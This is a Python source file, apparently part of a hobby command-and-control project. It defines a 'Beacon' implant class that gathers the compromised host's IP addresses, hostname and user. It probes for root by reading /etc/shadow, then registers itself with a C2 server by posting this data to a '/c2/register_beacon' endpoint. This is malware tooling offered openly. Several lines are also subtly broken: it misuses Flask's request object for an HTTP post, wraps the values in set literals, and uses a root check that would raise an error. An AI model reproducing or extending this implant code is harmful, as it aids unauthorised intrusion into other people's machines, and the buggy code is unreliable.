from flask import request, jsonify
import socket
import os
import sys
import subprocess
import re

class Beacon():
    def __init__(self):
        self.remote_ip = self.get_ip()[0]
        self.remote_hostname = self.get_hostname()
        self.remote_permissions = self.get_permissions()
        pass


    def register_beacon(self):
        compromised_ip = self.remote_ip
        compromised_hostname = self.remote_hostname
        compromised_permissions = self.remote_permissions

        r = request.post("http://localhost:5000/c2/register_beacon", json={"remote_ip":{compromised_ip}, "remote_hostname": {compromised_hostname}, "remote_permissions": {compromised_permissions}})  
        if r.status_code == 200:
            print(r.json().get('message'))

        else:
            print(f"Error: {r.status_code}, {r.text}")

        return (compromised_hostname, compromised_ip, compromised_permissions)
        

    def get_hostname(self):
        return socket.gethostname()
    
    def get_ip(self):
        ip_addresses = []
        try:
            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
            ip_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)')
            ip_addresses = ip_pattern.findall(result.stdout)
        except subprocess.CalledProcessError as e:
            print(f"Error while running 'ip addr': {e}")

        return ip_addresses

    def get_permissions(self):
            root = False
            name_result = subprocess.run(['whoami'], capture_output= True, text=True, check=True)
            name = name_result.stdout.strip()

            if "root" in name :
                root = True
                
            else:
                check_for_root = subprocess.run(['cat', '/etc/shadow'], capture_output= True, text=True, check=True)
                if "Permission denied" in check_for_root.stderr:
                    pass
                else:
                    root = True
                    
            return name, root
    